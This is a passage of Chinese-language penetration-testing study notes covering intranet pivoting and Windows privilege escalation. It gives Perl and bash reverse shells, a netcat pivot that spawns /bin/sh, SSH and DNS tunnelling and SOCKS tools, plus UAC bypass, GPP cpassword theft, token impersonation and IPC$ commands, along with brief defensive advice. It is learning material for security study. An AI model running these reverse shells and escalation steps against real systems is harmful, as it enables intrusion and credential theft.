+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;$i=<span class="hljs-string">&quot;192.168.1.4&quot;</span>;$p=<span class="hljs-number">4444</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>)),<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>bash反向shell <code>bash -i &gt;&amp; /dev/tcp/192.168.1.4/4444 0&gt;&amp;1</code></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>内网代理</p>
+<p>假设限制获取到了Web服务器的权限，通过Kali不能访问到数据库服务器，web服务器可以访问数据库服务器。使用netcat通过web服务器代理使kali获取到数据库服务器的shell</p>
+<p>kali：<code>nc -lvp 9999</code></p>
+<p>数据库服务器：<code>nc -lvp 9999 -e /bin/sh</code></p>
+<p>web服务器：<code>nc -v kali-ip 9999 -c &quot;nc -v 数据库-ip 9999&quot;</code></p>
+</li>
+</ul>
+<h6 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a><strong>PowerCat</strong></h6><p>PowerCat可以说是nc的powershel版，它可以通过执行命令回到本地运行，也可以使用远程权限运行，具体使用方法打到靶场再来总结</p>
+<h5 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a><strong>应用层隧道技术</strong></h5><h6 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a><strong>SSH协议</strong></h6><p>内网中Linux/UNIX服务器和网络设备都支持SSH协议，一般情况下SSH协议是被允许通过防火墙和边界设备的。SSH协议的传输过程</p>
+<p> <img src="https://gitee.com/lcdm123/image/raw/master/image-20210730125530065.png" srcset="/img/loading.gif" lazyload alt="image-20210730125530065"></p>
+<p><strong>本地转发</strong></p>
+<p>web服务器可以访问数据库服务器，vps可以访问web服务器，vps不能访问数据库  ，以web服务器为跳板机将数据库服务器的端口映射到vps的端口上</p>
+<p><code>ssh -CfNg -L vps-port:数据库服务器-ip:数据库服务器port root@192.168.1.103</code></p>
+<p>SSH进程的本地端口映射可以将本地的某个端口转发到远程指定的机器的指定端口；本地端口转发则是在本地监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口</p>
+<p><strong>远程转发</strong></p>
+<p><code>ssh -CfNg -R vps-port:数据库服务器-ip:数据库服务器port root@192.168.1.103</code></p>
+<p><strong>本地转发</strong>是将<strong>远程主机</strong>（服务器）某个端口的<strong>数据转发</strong>到<strong>本地机器的指定端口</strong>。<strong>远程端口转发</strong>则是在<strong>远程主机上监听一个端口</strong>，所有<strong>访问远程服务器指定端口的数据</strong>都会通过<strong>SSH隧道传输到本地对应端口</strong>。</p>
+<p><strong>动态转发</strong></p>
+<p>首先在vps上执行如下命令建立一个动态的SOCKS 4/5代理通道<code>ssh -CfNg -D 7000 root@192.168.1.103</code>，在本地浏览器设置网络代理，通过浏览器访问内网</p>
+<p><strong>防御措施</strong></p>
+<p>SSH隧道被攻击主要是因为系统访问控制措施不够，在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法来避免这一问题。在内网中至少要限制ssh远程登录的地址和双向访问控制策略</p>
+<h6 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP/HTTPS协议"></a><strong>HTTP/HTTPS协议</strong></h6><p>HTTP Service代理用于将所有的流量转发到内网，常见的代理工具有reGeorg，meterpreter，tunna等</p>
+<p>reGeorg是reDuh的升级版，主要功能就是把内网服务器端口的数据通过HTTP、HTTPS隧道转发到本机，实现基于HTTP协议的通信。其脚本特征明显，很多杀软都会对其进行查杀。</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
+<p>使用:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">python reGeorgSocksProxy.py -u http:<span class="hljs-regexp">//i</span>p:port/tunnel.jsp -p <span class="hljs-number">9999</span> 开启隧道端口<br>隧道正常工作后在kali上使用 ProxyChains之类的工具，访问目标内网<br></code></pre></td></tr></table></figure>
+
+<h6 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a><strong>DNS协议</strong></h6><p>用于管理僵尸网络和进行APT攻击的服务器叫做C&amp;C服务器，C&amp;C节点分为两种，分别是服务端（攻击者）和客户端（被控制的计算机）。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p>
+<p>DNS隧道的工作原理：在进行DNS查询的时候，如果查询的域名不在DNS服务器本机上的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议角度看 ，这样的操作只是一次次地查询某个特定的域名并且得到解析结果，但其本质问题是，<strong>预期的返回结果应该是一个IP，而事实上返回的结果可以是任意字符串</strong>（例如加密的C&amp;C指令）</p>
+<p>DNS隧道与外部通信时，表面上没有连接外网（内网网关没有转发IP数据包），但实际上内网的DNS服务器进行了中转操作。将其他协议封装在DNS协议中进行传输。</p>
+<p><strong>查看DNS连通性</strong></p>
+<p>首先我们需要找到当前服务器是否允许通过内部DNS解析外部域名</p>
+<p>查看当前内部域名以及IP：<code>cat /etc/resolv.conf | grep -v &#39;#&#39;</code></p>
+<p>查看是否与内部DNS通信：<code>nslookup lcdm123.com</code></p>
+<p>查询是否可以通过内部DNS服务器解析外部域名：<code>nslookup baidu.com</code></p>
+<p><strong>dnscat2</strong></p>
+<p>dnscat2时一款开源软件，它使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证。它的客户端是用C语言编写，服务端是用Ruby语言编写。</p>
+<p>dnscat2隧道模式有两种：</p>
+<ul>
+<li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求</li>
+<li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，这种比较慢</li>
+</ul>
+<p>DNS隧道应用场景：在安全策略严格的内网环境中，常见的C&amp;C通信端口会被众多安全设备监控，该网段只允许白名单流量出站，同时其他端口都被屏蔽了，传统的C&amp;C通信无法建立。</p>
+<p>工具：</p>
+<ul>
+<li><p>dnscat2</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a>   </p>
+<p>​            <a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a>   </p>
+<p>​            <a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p>
+</li>
+<li><p>iodine</p>
+</li>
+</ul>
+<p><strong>防御DNS隧道攻击</strong></p>
+<ol>
+<li>禁止任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信</li>
+<li>追踪用户的DNS查询次数，设置阈值</li>
+<li>阻止ICMP</li>
+<li>将邮件服务器、网关列入白名单并阻止传入和传出流量中的TXT请求</li>
+</ol>
+<h5 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h5><p>常见的网络环境</p>
+<ul>
+<li>服务器在内网中，可以任意访问外部网络</li>
+<li>服务器在内网中，可以访问外部网络但是服务器安装了防火墙来拒绝敏感端口的连接</li>
+<li>服务器在内网中，对外只开放了部分端口，并且服务器不能访问外部网络</li>
+</ul>
+<p>常用的Socks代理工具</p>
+<ul>
+<li><p><code>EarthWorm</code></p>
+<p>体积小，使用时不需要进行其他设置</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a></p>
+</li>
+<li><p><code>reGeorg</code></p>
+<p>上面HTTP隧道时介绍过，它利用webshell建立Socks代理进行内网穿透，服务器必须支持ASPX，PHP，JSP中的一种</p>
+</li>
+<li><p><code>sSocks</code></p>
+</li>
+<li><p><code>SocksCap64</code></p>
+<p>Windows中很好用的一款全局代理软件，操作方便</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://www.sockscap64.com/sockscap-64-free-download-zh-hans/">https://www.sockscap64.com/sockscap-64-free-download-zh-hans/</a></p>
+</li>
+<li><p><code>Proxifier</code></p>
+<p>提供了跨平台的端口转发和代理功能，适用于Windows，Linux，MacOS</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://www.proxifier.com/">https://www.proxifier.com/</a></p>
+</li>
+<li><p><code>ProxyChains</code></p>
+<p>在Linux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP，SOCKS 4 ，SOCKS 5类型的代理服务器</p>
+</li>
+</ul>
+<h5 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a><strong>上传和下载</strong></h5><ul>
+<li><p>利用FTP协议上传</p>
+</li>
+<li><p>利用VBS上传</p>
+</li>
+<li><p>利用Debug上传</p>
+<p>将.exe文件转换为HEX的形式，然后通过echo命令将HEX代码写入文件，最后利用Debug功能将HEX代码编译并还原为.exe文件</p>
+</li>
+<li><p>使用<code>Nishang</code>上传</p>
+</li>
+<li><p>利用<code>bitsadmin</code>下载（推荐在windows7 和 8 上使用）</p>
+</li>
+<li><p>利用<code>powershell</code>下载</p>
+</li>
+</ul>
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>Windows的四种权限</p>
+<ol>
+<li><code>User</code>：普通用户权限</li>
+<li><code>Administrator</code>：管理员权限，可以利用windows的机制将自己提升为System权限，以便操作SAM文件等</li>
+<li><code>System</code>：系统权限，可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作</li>
+<li><code>TrustedInstaller</code>：Windows中的最高权限，能够修改系统文件</li>
+</ol>
+<p><strong>纵向提权</strong>：低权限角色获得高权限角色的权限。</p>
+<p><strong>横向提权</strong>：获得同级别角色的权限。例如：在系统A中获取了系统B的权限</p>
+<p><strong>常用的提权方法</strong>：系统内核溢出漏洞提权，数据库提权，错误的系统配置提权，组策略首选项提权，Web中间件漏洞提权，DLL劫持提权，滥用最高权限令牌提权，第三方软件/服务提权等。</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806163424137.png" srcset="/img/loading.gif" lazyload alt="image-20210806163424137"></p>
+<h5 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h5><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></p>
+<p>内核溢出漏洞提权是一种通用的提权方法，通常利用这个方法绕过系统的所有安全限制。如果目标主机没有及时安装补丁，就可以找到相应的EXP提权。</p>
+<p>查看补丁列表：<code>systeminfo</code>  <code>wmic qfe get Caption,Description,HotFixID,Installedon0</code></p>
+<p>查询到补丁安装情况后可以去看哪些补丁漏装了，然后提权。</p>
+<p><code>Windows Exploit Suggester</code>：<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a> 这个工具将系统以及安装的补丁和微软的漏洞数据库进行比较识别出可能导致权限提升的漏洞，而其只需要目标系统的信息。</p>
+<p>这个是<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%8D%87%E7%BA%A7%E7%89%88">https://github.com/bitsadmin/wesng上面的升级版</a></p>
+<p>Metasploit内置了<code>local_exploit_suggester</code>模块，用于快速识别系统中可以被利用的漏洞；Powershell的Sherlock脚本可以快速查找可能用于本地权限提升的漏洞<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock%EF%BC%8C%E8%B0%83%E7%94%A8%E8%84%9A%E6%9C%AC%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E5%8D%95%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E6%89%80%E6%9C%89%E6%9C%AA%E5%AE%89%E8%A3%85%E7%9A%84%E8%A1%A5%E4%B8%81%E3%80%82">https://github.com/rasta-mouse/Sherlock，调用脚本后可以搜索单个漏洞也可以搜索所有未安装的补丁。</a></p>
+<h5 id="操作系统配置错误"><a href="#操作系统配置错误" class="headerlink" title="操作系统配置错误"></a>操作系统配置错误</h5><ol>
+<li><p><strong>系统服务权限配置错误</strong></p>
+<ul>
+<li>服务未运行：攻击者会使用任意服务来替换原来的服务，然后重启服务</li>
+<li>服务正在运行并且无法被终止：这个是大多数漏洞利用场景。攻击者通常会利用DLL劫持技术尝试重启服务来提权</li>
+</ul>
+<p>PowerUP：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%AF%BB%E6%89%BE%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E7%9A%84windows%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%9B">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1，用来寻找目标机器的windows服务漏洞；</a></p>
+<p>Metasploit中的模块是service_permissions，选择”AGGRESSIVE”选项可以利用目标机器上每一个有缺陷的服务，该选项被禁用时，模块在第一次提权成功后就会停止工作</p>
+</li>
+<li><p><strong>注册表键</strong> <code>AlwaysInstallElevated</code></p>
+<p>注册表键<code>AlwaysInstallElevated</code>是一个策略设置向，Windows允许低权限用户以System权限运行安装文件，如果启用此策略设置项，那么任何低权限用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI文件</p>
+<p><code>PathAlwaysInstallElevated</code>漏洞产生的原因是用户开启了Windows Installer特权安装功能。Windows Installer是windows的组件之一，专门用来管理和配置软件服务。它除了是一个安装程序，还用于管理软件的安装，管理软件组件的添加和删除，监视文件的还原，通过回滚进行灾难恢复等。Windows Installer分为客户端安装服务（Msiexec.exe）和MSI文件两部分，他们是一起工作的，Windows Installer通过Msiexec.exe安装MSI文件包含程序，MSI文件是Windows Installer的数据包，它实际上是一个数据库，包含安装和卸载软件是需要使用的大量指令和数据。简单来说，双击MSI文件就可以运行Msiexec.exe</p>
+<p>PowerUp的<code>Get-RegistryAlwaysInstallerElevated</code>模块用来检测注册表键是否被设置，如果<code>AlwaysInstallElevated</code>已经被设置就表明了MSI文件是以System权限运行的（True表示已经被设置）</p>
+<p>个人理解：这个漏洞就是利用MSI运行时权限问题来造成提权</p>
+</li>
+<li><p><strong>可信任服务路径漏洞</strong></p>
+<p>利用了windows文件路径解析的特性，如果一个服务的<strong>可执行文件的路径没有被双引号引起来且包含空格</strong>，那么这个服务就是有漏洞的</p>
+<ul>
+<li>如果路径和服务有关，就可以任意创建一个服务或者编译Service模板</li>
+<li>如果路径和可执行文件有关，就可以任意创建一个可执行文件</li>
+</ul>
+<p>寻找漏洞：<code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot; </code></p>
+<p>需要进一步检测目标文件夹的写权限，使用windows内置的工具<code>icacls</code>：<code>icacls &quot;path&quot;</code></p>
+<p>然后把上传的程序重命名放置在此漏洞且可写的目录下，重启服务<code>sc stop service_name</code> <code>sc start service _name</code></p>
+<p>MSF攻击模块 <code>exploit/windows/local/trusted_service_path</code>，它会自动反弹一个新的metertreter，查询显示提权成功，但是这个链接很快就会断开，需要在断开前迁移进程<code>set AutoRunScript migrate -f</code></p>
+</li>
+<li><p><strong>自动安装配置文件</strong></p>
+<p>网络管理员在内网给多台机器配置同一环境时，通常会使用脚本化批量部署，过程中会使用安装配置文件，这些文件会包含一些敏感信息</p>
+<p>文件检查：<code>dir /b /s c:\Unattend.xml</code></p>
+<p>MSF攻击模块：<code>post/windows/gather/enum_unattend</code></p>
+</li>
+<li><p><strong>计划任务</strong></p>
+<p>查看计划任务：<code>schtasks /query /fo LIST /v</code></p>
+<p>AccessChk是SysInterals套件中的一个工具，用于在windows中进行一些系统或程序的高级查询，管理，故障排除工作。它是微软官方提供的工具，一般不会被杀毒软件发现，下载：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%94%BB%E5%87%BB%E8%80%85%E5%AF%B9%E4%BB%A5%E9%AB%98%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E4%BB%BB%E5%8A%A1%E7%9B%AE%E5%BD%95%E6%9C%89%E5%8F%AF%E5%86%99%E6%9D%83%E9%99%90%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A6%86%E7%9B%96%E5%8E%9F%E7%A8%8B%E5%BA%8F%E3%80%82">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk，如果攻击者对以高权限运行的任务目录有可写权限就可以利用恶意程序覆盖原程序。</a></p>
+<p>查看目录权限配置情况：<code>accesschk.exe -dqv &quot;c:\Microsoft&quot; -accepteula</code></p>
+<p>其他常用命令</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">accesschk.exe /accepteula  <span class="hljs-comment"># 自动接受许可协议，避免弹出对话框</span><br><br><span class="hljs-comment"># 列出某个驱动下所有权限配置有缺陷的文件夹</span><br>accesschk.exe -uwdqsUsersc:<span class="hljs-string">\</span><br>accesschk.exe -uwqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\</span><br><span class="hljs-comment"># 列出某个驱动下所有权限配置有缺陷的文件</span><br>accesschk.exe -uwdqsUsersc:<span class="hljs-string">\*.*</span><br>accesschk.exe -uwqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\*.*</span><br></code></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<h5 id="组策略首选项提"><a href="#组策略首选项提" class="headerlink" title="组策略首选项提"></a>组策略首选项提</h5><p><strong>简介</strong></p>
+<p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有于控制器之间进行复制。SYSVOL文件夹是安装活动目录时自动创建的，用来存放登录脚本，组策略数据以及其它域控制器需要的域信息。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。SYSVOL目录中所有的域控制器中是自动同步的，所有域策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies\</code>中</p>
+<p>常见的组策略首选项（Group Policy Preferences，GPP)：</p>
+<ul>
+<li>映射驱动器（Drives.xml )</li>
+<li>创建本地用户</li>
+<li>数据源（DataSources.xml )</li>
+<li>打印机配置(Printers.xml )</li>
+<li>创建/更新服务(（Services.xml )</li>
+<li>计划任务（ScheduledTasks.xml )</li>
+</ul>
+<p><strong>获取组策略的凭据</strong></p>
+<p>管理员在域中新建一个组策略后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件保存了该组策略更新后的密码。该密码是使用AES-256加密算法，任何用户都可以访问保存在XML文件中的密码并解密，从而控制域中所有使用该账户/密码的本地管理员计算机。在SYSVOL中搜索，可以找到包含<code>cpassword</code>的XML文件</p>
+<ul>
+<li><p>手动查找<code>cpassword</code></p>
+</li>
+<li><p>使用<code>Powershell</code>获取<code>cpassword</code></p>
+<p>目标系统导入Get-GPPPassword.ps1脚本获取</p>
+</li>
+<li><p>使用MSF查找<code>cpassword</code></p>
+<p>选择相应的模块即可</p>
+</li>
+<li><p>使用Empire查找<code>cpassword</code></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">usemodule</span> privesc/gpp<br><span class="hljs-literal">info</span><br>execute<br></code></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>除了Groups.xml还有几个组策略首选项文件中有可选的cpassword 属性</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Services\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Scrvices</span>.</span></span>xml<br>scheduledTasks\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScheduledTasks</span>.</span></span>xml.<br>Printers\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Printers</span>.</span></span>xml<br>Drives\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Drives</span>.</span></span>xml<br>DataSources\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataSources</span>.</span></span>xml<br></code></pre></td></tr></table></figure>
+
+<h5 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h5><blockquote>
+<p>UAC(User Account Control) 在操作启动前对用户的身份进行验证，避免恶意软件在计算机上执行安装操作或更改计算机设置；微软设置了安全控制策略，分为高，中，低三个等级，高等级具有管理员权限，中等级有普通用户权限，低等级的权限是有限的</p>
+<p>UAC有四种设置要求：<br>1、始终通知<br>2、仅在程序试图更改我的计算机时通知我（默认设置）<br>3、仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）<br>4、从不提示</p>
+</blockquote>
+<ul>
+<li><p><strong>bypassuac</strong> 模块</p>
+<p>使用MSF的<code>bypassuac</code>模块的时候，当前用户必须在管理员组中，且UAC为默认设置（即：仅在程序试图更改我的计算机时通知我），bypassuac模块运行时，会在目标机器上创建多个文件，这些文件会被杀软识别，但是<code>bypassuac_injection</code>模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，被检测出来的概率小。</p>
+</li>
+<li><p><strong>RunAs</strong> 模块</p>
+<p>使用<code>exploit/windows/local/ask</code>模块，创建一个可执行文件，目标机器会运行一个发起提升权限的请求程序提示用户是否要继续运行，如果用户选择继续运行，就会返回一个高权限shell。</p>
+<p>想要执行RunAs模块进行提权，当前用户必须在管理员组或者知道管理员的密码，对UAC的设置没有要求，使用RunAs模块时需要使用<code>EXE::Custom</code>选项创建一个可执行文件（需要免杀处理）</p>
+</li>
+<li><p>Nishang中的Invoke-PaUACme模块</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Invoke-PsUACme -Verbose # 使用Sysprep方法并执行默认的payload<br>Invoke-PsUACme -<span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">oobe</span> -<span class="hljs-title">Verbose</span> # 使用<span class="hljs-title">oobe</span>方法并执行默认的<span class="hljs-title">payload</span></span><br><span class="hljs-function"><span class="hljs-title">Invoke</span>-<span class="hljs-title">PsUACme</span> -<span class="hljs-title">method</span> <span class="hljs-title">oobe</span> -<span class="hljs-title">Verbose</span> -<span class="hljs-title">Payload</span> &quot;<span class="hljs-title">powershell</span> -<span class="hljs-title">windowstyle</span> <span class="hljs-title">hidden</span> -<span class="hljs-title">e</span> <span class="hljs-title">YourPayload</span>&quot;  # 自己指定<span class="hljs-title">payload</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">-<span class="hljs-title">PayloadPath</span> 指定<span class="hljs-title">payload</span>的路径</span><br><span class="hljs-function">-<span class="hljs-title">CustomDll64</span> 或 -<span class="hljs-title">CustomDll32</span> 可以自定义<span class="hljs-title">DLL</span>文件</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Empire中的bypassuac模块</p>
+<ul>
+<li><p>bypassuac模块</p>
+<p>在Empire中输入<code>usemodule privesc/bypassuac</code> 设置监听参数，执行 <code>execute</code>就可以获得新的shell，使用list查看，带星号（*）就表示提权成功</p>
+</li>
+<li><p>bypassuac_wscript模块</p>
+<p>模块大致原理就是使用<code>C:\Windows\wscript.exe</code>执行<code>Payload</code>绕过UAC，适用于Win7，查看带星号（*）就表示提权成功</p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h5><blockquote>
+<p>令牌是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求的是哪个账户，令牌将持续存在于系统中（除非系统重启）</p>
+</blockquote>
+<p>伪造令牌攻击的核心是<code>Kerberos</code>协议</p>
+<p>MSF获取令牌</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> incognito <br>list_tokens -u <span class="hljs-comment"># 列出可用的token 令牌的数量取决于MSFshell的级别</span><br>impersonate_token 令牌 <span class="hljs-comment"># 假冒令牌</span><br></code></pre></td></tr></table></figure>
+
+<p>如果系统存在有效的令牌，我们也可以尝试通过Rotten Potato程序来模拟用户令牌实现权限的提升</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p>
+<p>使用MSF查询可用令牌</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">use</span> <span class="hljs-string">incognito</span><br><span class="hljs-attr">list_tokens</span> <span class="hljs-string">-u</span><br></code></pre></td></tr></table></figure>
+
+<p>将<code>rottenpotato.exe</code>上传到目标机器中</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">upload rottenpotato.exe <span class="hljs-comment"># MSF上传</span><br>execute -HC -f rottenpotato.exe<br>impersonate_token 令牌 <span class="hljs-comment"># 导入令牌</span><br></code></pre></td></tr></table></figure>
+
+<p>学习文章</p>
+<p><a target="_blank" rel="noopener" href="https://hackergu.com/powerup-stealtoken-rottenpotato/">https://hackergu.com/powerup-stealtoken-rottenpotato/</a></p>
+<h5 id="无凭证条件下的权限获取"><a href="#无凭证条件下的权限获取" class="headerlink" title="无凭证条件下的权限获取"></a>无凭证条件下的权限获取</h5><p><strong>LLMNR和NetBIOS欺骗攻击</strong></p>
+<p>LLMNR（本地链路多播名称解析）是一种域名系统数据包格式。当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段中机器的名称，指导DNS回复正常为止。LLMNR支持IPv6</p>
+<p>NetBIOS是一种网络协议，根据NetBIOS协议广播获得计算机名称，并将其解析为相应的IP地址，NetBIOS不支持IPv6</p>
+<p>Net-NTLM Hash 与 NTLM Hash不同</p>
+<p>NTLM Hash 是指Windows操作系统的Security Account Manager中保存的用户密码散列值。NTLM Hash通常保存在windows中的SAM文件或者ntds.dit数据库中，用户对访问资源的用户进行身份验证</p>
+<p>Net-NTLM Hash 是指在网络环境中经过NTLM认证的散列值。挑战/响应验证中的响应就包含了Net-NTLM Hash，使用Responder抓取的通常就是Net-NTLM Hash，攻击者无法使用该散列值进行哈希传递攻击，只能使用Hashcat等工具获得明文后进行横向移动</p>
+<p>攻击工具可以使用<code>Responder</code></p>
+<h4 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h4><h5 id="Windows远程连接和相关命令"><a href="#Windows远程连接和相关命令" class="headerlink" title="Windows远程连接和相关命令"></a>Windows远程连接和相关命令</h5><p><strong>IPC</strong></p>
+<p>IPC共享“命名管道”的资源，为了实现远程进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p>
+<p>通过<code>ipc$</code>可以与目标机器建立连接，利用这个连接可以访问目标机器中的文件，进行上传下载操作和运行其他命令</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">建立一个ipc$<br>net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">17.18</span>\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;password&quot;</span> /<span class="hljs-symbol">user:</span>administrator<br>查看已经建立的连接<br>net <span class="hljs-keyword">use</span><br></code></pre></td></tr></table></figure>
+
